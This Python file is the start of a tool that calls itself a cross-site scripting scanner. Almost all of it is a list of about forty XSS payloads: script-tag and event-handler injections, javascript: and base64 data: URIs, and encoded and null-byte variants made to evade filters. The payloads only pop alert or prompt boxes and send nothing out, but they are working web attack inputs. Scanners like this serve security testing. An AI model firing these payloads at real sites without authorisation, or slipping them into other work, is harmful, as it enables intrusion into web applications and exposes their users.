#!/usr/bin/env python
# -*- coding: cp1252 -*-
# XSSA is a Cross Site Scripting Scanner & Vulnerability Confirmation
# By Yehia Mamdouh - twitter.com/@Yehia1mamdouh / Facebook/yehia.mamdouh.98




class check:
        def __init__(self):
                self.hit = ["<script>alert(\"xssya\")</script>",
                            "1<ScRiPt >prompt(962477)</sCripT>",
                            "<script>alert('xssya')</script>",
                            "1<ScRiPt>prompt(999691)</ScRiPt>",
                            "//1<ScRiPt>prompt(919397)</ScRiPt>",
                            "'';!--\"<XSS>=&{()}",
                            "<scRiPt>alert(1);</scrIPt>",
                            "\"><scRipt>alert('xssya')</scRipt>",
                            "'\"</scRipt><scRipt>alert('xssya')</scRipt>",
                            "\"><img src=x onerror=prompt(1)>",
                            "<q/oncut=alert(1)>",
                            "\";alert(1)//",
                            "<ScRipt>ALeRt('xssya');</sCRipT>",
                            "javascript:alert(1)//",
                            "%27%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Ealert(%27xss%27)%3C/scRipt%3E",
                            "<script>confirm(0);</script>",
                            "data:text/html,<script>alert(0)</script>",
                            "<script>alert(1);</script>",
                            "%3Cimg%20src=%22x:alert%22%20onerror=%22eval(src%2b%27(0)%27)%22%3E",
                            "<img src=\"x:alert\" onerror=\"eval(src+'(0)')\">",
                            "<body/onhashchange=alert(1)><a href=#>clickit",
                            "<img src=x onerror=prompt(1);>",
                            "%3cvideo+src%3dx+onerror%3dprompt(1)%3b%3e",
                            "<iframesrc=\"javascript:alert(2)\">",
                            "<iframe/src=\"data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\">",
                            "<form action=\"Javascript:alert(1)\"><input type=submit>",
                            "<isindex action=data:text/html, type=image>",
                            "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=\">",
                            "<svg/onload=prompt(1);>",
                            "<marquee/onstart=confirm(2)>/",
                            "<textarea autofocus onfocus=alert(1)>",
                            "<body onload=prompt(1);>",
                            "<q/oncut=open()>",
                            "<a onmouseover=location=?javascript:alert(1)>click",
                            "<svg><script>alert&#40/1/&#41</script>",
                            "&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;",
                            "<scri%00pt>alert(1);</scri%00pt>",
                            "<scri%00pt>confirm(0);</scri%00pt>",
                            "5\x72\x74\x28\x30\x29\x3B'>rhainfosec",
                            "<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>",
                            "<marquee/onstart=confirm(2)>",
                            "<video><source onerror='javascript:alert(1)'>",
                            "<A HREF=\"http://www.google.com./\">XSS</A>",
                            "<svg/onload=prompt(1);>",]


